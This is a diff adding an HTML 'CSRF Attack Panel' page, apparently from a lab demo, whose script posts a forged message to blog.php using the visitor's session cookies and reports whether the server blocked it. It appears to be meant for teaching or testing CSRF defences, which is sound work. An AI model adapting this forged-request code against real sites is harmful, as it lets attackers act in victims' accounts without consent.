@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Attacker Demo</title>
+  <style>
+    body { font-family: sans-serif; text-align: center; margin-top: 50px; }
+    button { padding: 12px 24px; font-size: 16px; }
+  </style>
+</head>
+<body>
+  <h2>CSRF Attack Panel</h2>
+  <p>This simulates a CSRF attack to blog.php using session cookies.</p>
+
+  <!-- Attack trigger button -->
+  <button onclick="launchAttack()">🔥 Launch Attack</button>
+
+  <script>
+    function launchAttack() {
+      // Create a FormData object and add the CSRF message
+      const formData = new FormData();
+      formData.append('content', 'Automatically posted by CSRF via session cookie!');
+
+      // Send a POST request to blog.php with cookies included
+fetch('blog.php', {
+  method: 'POST',
+  credentials: 'include',
+  body: formData
+})
+.then(res => res.text())  // Read response text
+.then(text => {
+  if (text.includes("Access denied")) {
+    alert("CSRF attack blocked: Server says → " + text);
+  } else {
+    alert("CSRF attack sent successfully! Check the Blog panel.");
+  }
+
+  // Auto-refresh blog iframe to show if insertion was successful
+  const blogFrame = parent.document.getElementById('blogFrame');
+  if (blogFrame) {
+    blogFrame.contentWindow.location.reload();
+  }
+})
+.catch(err => {
+  console.error("Attack failed:", err);
+  alert("An error occurred during the CSRF attack.");
+});
+
+    }
+  </script>
+</body>
+</html>
